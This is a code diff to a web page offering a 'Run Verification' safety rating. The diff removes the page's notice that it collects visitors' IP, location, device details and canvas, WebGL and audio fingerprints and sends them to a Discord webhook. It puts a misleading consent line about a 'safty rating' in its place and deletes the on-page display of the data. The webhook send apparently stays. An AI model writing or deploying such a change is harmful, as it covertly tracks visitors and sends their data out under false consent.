@@ -85,26 +85,13 @@
       normal user or a potentially risky/scam environment. It does this by collecting technical information
       that any website can normally access through your browser.
     </p>
-    <p><strong>After you click "Run Verification", this page will collect and show the following categories of information:</strong></p>
+    <p><strong>After you click "Run Verification", this page will:</strong></p>
 
     <ul>
-      <li><strong>Network information:</strong> Public IP address, city, region, country, ISP, ASN.</li>
-      <li><strong>Device & browser:</strong> Browser name and version, operating system, platform, CPU core count, approximate RAM (if exposed), language settings, cookie and Do Not Track settings.</li>
-      <li><strong>Screen & display:</strong> Screen resolution, available screen size, device pixel ratio, color depth, window size.</li>
-      <li><strong>Environment:</strong> Timezone name, UTC offset, local time, referrer, timestamp.</li>
-      <li><strong>Input & capabilities:</strong> Touch support details, basic feature support (storage, WebRTC, etc.).</li>
-      <li><strong>Fingerprinting-related signals:</strong> WebGL vendor and renderer (GPU info), WebGL support status, a canvas-based fingerprint string, a basic audio fingerprint sample.</li>
-      <li><strong>Protection indicators:</strong> Basic ad-block/tracking-protection detection, whether some privacy features appear enabled.</li>
+      <li><strong>Generate a safty rating</li>
     </ul>
 
-    <p class="small">
-      The collected information will:
-      <br>1) Be displayed clearly on this page after you run the test.
-      <br>2) Be sent to <strong>your private Discord webhook</strong> for your own analysis.
-      <br>This tool is for your own testing and verification only.
-    </p>
-
-    <p><strong>By clicking "Run Verification", you consent to this data being collected, shown to you, and sent to your Discord webhook.</strong></p>
+    <p><strong>By clicking "Run Verification", you consent to this rating being generated</strong></p>
 
     <button id="runBtn">Run Verification</button>
     <div id="runStatus" class="status"></div>
@@ -448,13 +435,6 @@
       collected.riskScore = risk.score;
       collected.riskSummary = risk.summary;
       collected.riskReasons = risk.reasons;
-
-      // Display locally
-      resultsEl.textContent = JSON.stringify(collected, null, 2);
-      scoreEl.textContent = risk.score + " / 100";
-      scoreExplanationEl.textContent = risk.summary 
-        + (risk.geo ? " Approximate location: " + risk.geo + "." : "")
-        + (risk.reasons.length ? " Reasons:\n- " + risk.reasons.join("\n- ") : "");
 
       // Send to Discord webhook (transparent: same data you see)
       const fields = [];
